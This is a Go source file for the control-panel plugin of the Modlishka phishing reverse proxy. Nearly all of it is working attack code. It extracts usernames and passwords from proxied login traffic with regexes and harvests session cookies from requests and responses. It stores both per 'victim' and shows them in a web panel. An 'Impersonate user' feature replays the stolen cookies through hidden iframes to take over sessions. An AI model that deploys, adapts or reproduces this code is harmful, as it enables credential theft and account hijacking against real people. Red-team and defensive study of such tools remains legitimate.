/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package plugin

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/drk1wi/Modlishka/config"
	"github.com/drk1wi/Modlishka/log"
	"github.com/tidwall/buntdb"
	"html/template"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

type ExtendedControlConfiguration struct {
	*config.Options
	CredParams *string `json:"CredParams"`
}

type ControlConfig struct {
	db             *buntdb.DB
	usernameRegexp *regexp.Regexp
	passwordRegexp *regexp.Regexp
	active         bool
}

type RequetCredentials struct {
	usernameFieldValue string
	passwordFieldValue string
}

const URL = `SayHello2Modlishka`

var htmltemplate = `<!DOCTYPE html>
<html lang="en">
<head>
  <title>Modlishka Control Panel v.0.1 (beta)</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <script>

function clearcookies(){
    var cookies = document.cookie.split("; ");
    for (var c = 0; c < cookies.length; c++) {
        var d = window.location.hostname.split(".");
        while (d.length > 0) {
            var cookieBase = encodeURIComponent(cookies[c].split(";")[0].split("=")[0]) + '=; expires=Thu, 01-Jan-1970 00:00:01 GMT; domain=' + d.join('.') + ' ;path=';
            var p = location.pathname.split('/');
            document.cookie = cookieBase + '/';
            while (p.length > 0) {
                document.cookie = cookieBase + p.join('/');
                p.pop();
            };
            d.shift();
        }
    }
};

  </script>
</head>
<body>

<div class="container">
  <h2>Collected user credentials</h2>
  <table class="table table-dark">
    <thead class="thead-dark">
      <tr>
        <th>UUID</th>
        <th>Username</th>
        <th>Password</th>
        <th>Session</th>

      </tr>
    </thead>
    <tbody>
    {{range .}}
      <tr>
        <td>{{.UUID}}</td>
        <td>{{.Username}}</td>
        <td>{{.Password}}</td>
        <td><a onclick="clearcookies();" href="/` + URL + `/ImpersonateFrames?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-warning">Impersonate user (beta)</a>
		</td>

      </tr>
    {{end}}
    </tbody>
  </table>
</div>

</body>
</html>
`

var iframetemplate = `<!DOCTYPE html>
<html lang="en">
<head>
 <title>Modlishka Control Panel v.0.1.</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<style>

html,body{
       width: 100%;
	   height: 100%;
}

 body {
     background: #0d161f;
}

#circle {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%,-50%);
	width: 150px;
    height: 150px;	
}

.loader {
    width: calc(100% - 0px);
	height: calc(100% - 0px);
	border: 8px solid #162534;
	border-top: 8px solid #09f;
	border-radius: 50%;
	animation: rotate 5s linear infinite;
}

@keyframes rotate {
100% {transform: rotate(360deg);}
} </style>
</head>
<body>
<script>

setTimeout(function() {document.location='/'; }, 5000); 

</script>

<div id="circle">
  <div class="loader">
    <div class="loader">
        <div class="loader">
           <div class="loader">
           </div>
        </div>
    </div>
  </div>
</div> 

 {{range .}}
 <iframe style="width:0; height:0; border:0; border:none" src="{{.}}"></iframe>
 {{ end }}

</body>
</html>
`

type Victim struct {
	UUID     string
	Username string
	Password string
	Session  string
}
type Cookie struct {
	Name     string    `json:"name"`
	Value    string    `json:"value"`
	Domain   string    `json:"domain"`
	Secure   bool      `json:"secure"`
	HTTPOnly bool      `json:"httponly"`
	Expires  time.Time `json:"expires"`
}

type CookieJar struct {
	Cookies map[string]*Cookie `json:"cookies"`
}

var credentialParameters = flag.String("credParams", "", "Credential regexp with matching groups.example: baase64(username_regex),baase64(password_regex)")

var CConfig ControlConfig

func getEmptyJar() (*CookieJar, error) {

	jar := CookieJar{
		Cookies: make(map[string]*Cookie),
	}

	return &jar, nil
}

func sameDomainLevel(domain1 string, domain2 string) bool {
	return bool(len(strings.Split(domain1, ".")) == len(strings.Split(domain2, ".")))

}

func sameDomainUpperLevel(domain1 string, domain2 string) bool {
	d1 := strings.Split(domain1, ".")
	d1out := strings.Join(d1, "")

	d2 := strings.Split(domain2, ".")
	d2out := strings.Join(d2, "")

	return strings.Contains(d1out, d2out)

}

func (jar *CookieJar) setCookie(cookie *Cookie) {

	if jar.Cookies[cookie.Name] == nil {
		jar.Cookies[cookie.Name] = cookie
	}

	if !cookie.Expires.IsZero() && cookie.Expires.Before(time.Now()) {
		delete(jar.Cookies, cookie.Name)
		return
	}

	if jar.Cookies[cookie.Name].Domain == "" {
		jar.Cookies[cookie.Name].Domain = cookie.Domain
	}

	if sameDomainUpperLevel(jar.Cookies[cookie.Name].Domain, cookie.Domain) {
		jar.Cookies[cookie.Name].Domain = cookie.Domain
	}

	jar.Cookies[cookie.Name].Value = cookie.Value

}

func (jar *CookieJar) marshalJSON() ([]byte, error) {

	b, err := json.Marshal(jar)
	return b, err

}

func (jar *CookieJar) initJSON(val []byte) error {

	err := json.Unmarshal([]byte(val), &jar)
	if err != nil {
		return err
	}

	return nil

}

func (victim *Victim) setCookies(cookies []*http.Cookie, url *url.URL) error {

	jar, err := getEmptyJar()
	if err != nil {
		return err
	}

	if victim.Session != "" {
		err = json.Unmarshal([]byte(victim.Session), &jar)
		if err != nil {
			return err
		}
	}

	for _, v := range cookies {
		c := Cookie{
			Name:     v.Name,
			Domain:   v.Domain,
			Value:    v.Value,
			Expires:  v.Expires,
			HTTPOnly: v.HttpOnly,
			Secure:   v.Secure,
		}

		jar.setCookie(&c)

	}

	b, err := jar.marshalJSON()
	if err != nil {
		log.Debugf("%s", err.Error())
	}
	victim.Session = string(b)

	return nil
}

func (config *ControlConfig) printEntries() error {

	err := config.db.View(func(tx *buntdb.Tx) error {
		err := tx.Ascend("", func(key, value string) bool {
			//log.Infof("key: %s, value: %s\n", key, value)
			return true
		})
		return err
	})

	if err != nil {
		return err
	}

	return nil
}

func (config *ControlConfig) listEntries() ([]Victim, error) {

	victims := []Victim{}
	err := config.db.View(func(tx *buntdb.Tx) error {
		err := tx.Ascend("", func(key, value string) bool {
			victim := Victim{}
			err := json.Unmarshal([]byte(value), &victim)
			if err != nil {
				return false
			}
			victims = append(victims, victim)
			return true
		})
		return err
	})

	if err != nil {
		return nil, err
	}

	return victims, nil
}

func (config *ControlConfig) getEntry(victim *Victim) (*Victim, error) {

	returnentry := Victim{}
	err := config.db.View(func(tx *buntdb.Tx) error {
		val, err := tx.Get(victim.UUID)
		if err != nil {
			return err
		}

		victim := Victim{}
		err = json.Unmarshal([]byte(val), &victim)
		if err != nil {
			return err
		}
		returnentry = victim
		return nil
	})

	if err != nil {
		return nil, err
	}

	return &returnentry, nil
}

func (config *ControlConfig) getOrCreateEntry(victim *Victim) (*Victim, error) {

	entry, err := config.getEntry(victim)
	if err == buntdb.ErrNotFound {
		err = config.addEntry(victim)
		if err != nil {
			return nil, err
		}
		entry = victim
	}

	return entry, nil
}

func (config *ControlConfig) addEntry(victim *Victim) error {

	//log.Infof("Adding entry %s %s %s",victim.UUID,victim.Username,victim.Password)

	b, err := json.Marshal(victim)
	if err != nil {
		return err
	}

	err = config.db.Update(func(tx *buntdb.Tx) error {
		_, _, err := tx.Set(victim.UUID, string(b), nil)
		return err
	})

	return nil
}

func (config *ControlConfig) updateEntry(victim *Victim) error {

	entry, err := CConfig.getOrCreateEntry(victim)
	if err != nil {
		return err
	}

	if victim.Password != "" {
		entry.Password = victim.Password
	}
	if victim.Username != "" {
		entry.Username = victim.Username
	}

	if victim.Session != "" {
		entry.Session = victim.Session
	}

	err = config.addEntry(entry)
	if err != nil {
		return err
	}

	return nil
}

func notifyCollection(victim *Victim) {

	if victim.Username != "" && victim.Password != "" {
		log.Infof("Credentials collected ID:[%s] username: %s password: %s", victim.UUID, victim.Username, victim.Password)
	}

	if victim.Username == "" && victim.Password != "" {
		log.Infof("Password collected ID:[%s] password: %s", victim.UUID, victim.Password)
	}

	if victim.Username != "" && victim.Password == "" {
		log.Infof("Username collected ID:[%s] username: %s ", victim.UUID, victim.Username)
	}
}

func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*RequetCredentials, bool) {

	creds := &RequetCredentials{}

	if req.Method == "GET" {
		queryString := req.URL.Query()
		if len(queryString) > 0 {
			for key := range req.URL.Query() {

				usernames := config.usernameRegexp.FindStringSubmatch(queryString.Get(key))
				if len(usernames) > 0 {
					creds.usernameFieldValue = usernames[1]
				}

				passwords := config.passwordRegexp.FindStringSubmatch(queryString.Get(key))
				if len(passwords) > 0 {
					creds.passwordFieldValue = passwords[1]
				}

			}
		}

	} else if req.Method == "POST" {

		if req.Body == nil {
			return nil, false
		}

		body, err := ioutil.ReadAll(req.Body)
		if err != nil {
			log.Debugf("Error reading body: %v", err)
		}

		decodedbody, err := url.QueryUnescape(string(body))
		if err != nil {
			log.Debugf("Error decoding body: %v", err)
		}

		//log.Infof("%s",decodedbody)

		usernames := config.usernameRegexp.FindStringSubmatch(decodedbody)
		if len(usernames) > 0 {
			creds.usernameFieldValue = usernames[1]
		}

		passwords := config.passwordRegexp.FindStringSubmatch(decodedbody)
		if len(passwords) > 0 {
			creds.passwordFieldValue = passwords[1]
		}

		//for parameterName := range req.Form {
		//	log.Infof("param value %s",req.Form.Get(parameterName))
		//
		//}

		// reset body state.
		req.Body = ioutil.NopCloser(bytes.NewBuffer(body))

	}

	if creds.passwordFieldValue != "" || creds.usernameFieldValue != "" {
		return creds, true

	}

	return nil, false
}

func HelloHandler(w http.ResponseWriter, r *http.Request) {

	w.WriteHeader(http.StatusOK)
	w.Header().Set("Content-Type", "application/json")
	victims, _ := CConfig.listEntries()
	t := template.New("modlishka")
	t, _ = t.Parse(htmltemplate)
	_ = t.Execute(w, victims)

	//v,_ :=json.Marshal(&victims)
	//io.WriteString(w,string(v))
}

func HelloHandlerImpersonate(w http.ResponseWriter, r *http.Request) {

	users, ok := r.URL.Query()["user_id"]

	if !ok || len(users[0]) < 1 {
		log.Infof("Url Param 'users_id' is missing")
		return
	}

	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
	entry, err := CConfig.getEntry(&victim)
	if err != nil {
		log.Infof("Error %s", err.Error())
		return
	}
	var jar = CookieJar{}
	err = json.Unmarshal([]byte(entry.Session), &jar)
	if err != nil {
		log.Infof("Error %s", err.Error())
		return
	}

	for _, v := range jar.Cookies {

		if r.Host == v.Domain || r.Host == v.Domain[1:] {
			cookie := fmt.Sprintf("%s=%s;Domain=%s; Path=/; Expires=%s;Priority=HIGH",
				v.Name,
				v.Value,
				v.Domain,
				time.Now().Add(365*24*time.Hour).UTC().String())

			if v.Secure {
				cookie = cookie + ";Secure"
			}

			if v.HTTPOnly {
				cookie = cookie + ";HttpOnly"
			}

			w.Header().Add("Set-Cookie", cookie)
		}

	}

	w.Header().Get("Set-Cookie")

	w.WriteHeader(http.StatusOK)

	w.Header().Set("Content-Type", "application/html")

	_, _ = io.WriteString(w, "")

}

func HelloHandlerImpersonateFrames(w http.ResponseWriter, r *http.Request) {

	users, ok := r.URL.Query()["user_id"]

	if !ok || len(users[0]) < 1 {
		log.Infof("Url Param 'users_id' is missing")
		return
	}

	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
	entry, err := CConfig.getEntry(&victim)
	if err != nil {
		log.Infof("Error %s", err.Error())
		return
	}
	var jar = CookieJar{}
	err = json.Unmarshal([]byte(entry.Session), &jar)
	if err != nil {
		log.Infof("Error %s", err.Error())
		return
	}

	domains := make(map[string]string)

	for _, v := range jar.Cookies {

		if string(v.Domain[0]) == "." {
			domains[v.Domain[1:]] = ""
		} else {
			domains[v.Domain] = ""
		}
	}

	var iframes []string
	for k, _ := range domains {
		iframes = append(iframes, "https://"+k+"/"+URL+"/Impersonate?user_id="+users[0])
	}

	w.WriteHeader(http.StatusOK)

	w.Header().Set("Content-Type", "application/html")

	t := template.New("modlishkaiframe")
	t, _ = t.Parse(iframetemplate)
	_ = t.Execute(w, iframes)

}

func init() {

	s := Property{}
	s.Name = "control_panel"
	s.Description = "This is a web control panel for you phishing engagements. Beta version."
	s.Version = "0.1"

	//init all of the vars, print a welcome message, init your command line flags here
	s.Init = func() {

		//init database
		db, err := buntdb.Open("control_plugin_data.db")
		if err != nil {
			log.Fatal(err)
		}

		err = db.SetConfig(buntdb.Config{
			SyncPolicy: buntdb.EverySecond,
		})

		if err != nil {
			log.Fatal(err)
		}

		CConfig.db = db

	}

	// process all of the cmd line flags and config file (if supplied)
	s.Flags = func() {

		CConfig.active = false

		var creds []string

		var jsonConfig ExtendedControlConfiguration

		if len(*config.JSONConfig) > 0 {

			ct, err := os.Open(*config.JSONConfig)
			if err != nil {
				log.Errorf("Error opening JSON configuration (%s): %s", *config.JSONConfig, err)
				return
			}

			ctb, _ := ioutil.ReadAll(ct)
			if err = json.Unmarshal(ctb, &jsonConfig); err != nil {
				log.Errorf("Error unmarshalling JSON configuration (%s): %s", *config.JSONConfig, err)
				return
			}

			if err := ct.Close(); err != nil {
				log.Errorf("Error closing JSON configuration (%s): %s", *config.JSONConfig, err)
				return
			}

		}

		if jsonConfig.CredParams != nil {
			creds = strings.Split(*jsonConfig.CredParams, ",")
		} else if *credentialParameters != "" {
			creds = strings.Split(*credentialParameters, ",")
		}

		if len(creds) > 1 {

			decodedusername, err := base64.StdEncoding.DecodeString(creds[0])
			if err != nil {
				log.Fatalf("decode error:", err)
				return
			}
			decodedpaswrd, err := base64.StdEncoding.DecodeString(creds[1])
			if err != nil {
				log.Fatalf("decode error:", err)
				return
			}

			CConfig.usernameRegexp = regexp.MustCompile(string(decodedusername))
			CConfig.passwordRegexp = regexp.MustCompile(string(decodedpaswrd))

			CConfig.active = true
			log.Infof("Control Panel: Collecting usernames with [%s] regex and passwords with [%s] regex", string(decodedusername), string(decodedpaswrd))

		}

	}

	// Register your http handlers
	s.RegisterHandler = func(handler *http.ServeMux) {

		handler.HandleFunc("/"+URL+"/", HelloHandler)
		handler.HandleFunc("/"+URL+"/ImpersonateFrames", HelloHandlerImpersonateFrames)
		handler.HandleFunc("/"+URL+"/Impersonate", HelloHandlerImpersonate)

		log.Infof("Control Panel: " + URL + " handler registered	")
		log.Infof("Control Panel URL: /" + URL)

	}

	//process HTTP request
	s.HTTPRequest = func(req *http.Request, context HTTPContext) {

		if CConfig.active {

			if creds, found := CConfig.checkRequestCredentials(req); found {

				victim := Victim{UUID: context.PhishUser, Username: creds.usernameFieldValue, Password: creds.passwordFieldValue}
				if err := CConfig.updateEntry(&victim); err != nil {
					log.Infof("Error %s", err.Error())
					return
				}
				notifyCollection(&victim)
				//_=CConfig.printEntries()

			}

			cookies := req.Cookies()
			// there are new set-cookies
			if len(cookies) > 0 {
				victim := Victim{UUID: context.PhishUser}
				entry, err := CConfig.getEntry(&victim)
				if err != nil {
					return
				}

				for i, _ := range cookies {
					cookies[i].Domain = context.OriginalTarget
				}

				err = entry.setCookies(cookies, context.Target)
				if err != nil {
					return
				}

				err = CConfig.updateEntry(entry)
				if err != nil {
					return
				}

			}

		}

	}

	//process HTTP response (responses can arrive in random order)
	s.HTTPResponse = func(resp *http.Response, context HTTPContext) {

		cookies := resp.Cookies()
		// there are new set-cookies
		if len(cookies) > 0 {

			victim := Victim{UUID: context.PhishUser}
			entry, err := CConfig.getEntry(&victim)
			if err != nil {
				return
			}

			for i, _ := range cookies {
				if cookies[i].Domain == "" {
					td := strings.Replace(*config.C.Target, "http://", "", -1)
					td = strings.Replace(td, "https://", "", -1)
					t := strings.Replace(context.Target.Host, td, *config.C.PhishingDomain, -1)
					cookies[i].Domain = t
				}

				//log.Infof("%s",cookies[i].Domain)

			}

			err = entry.setCookies(cookies, context.Target)
			if err != nil {
				return
			}

			err = CConfig.updateEntry(entry)
			if err != nil {
				return
			}

		}

	}

	// Register all the function hooks
	s.Register()

}
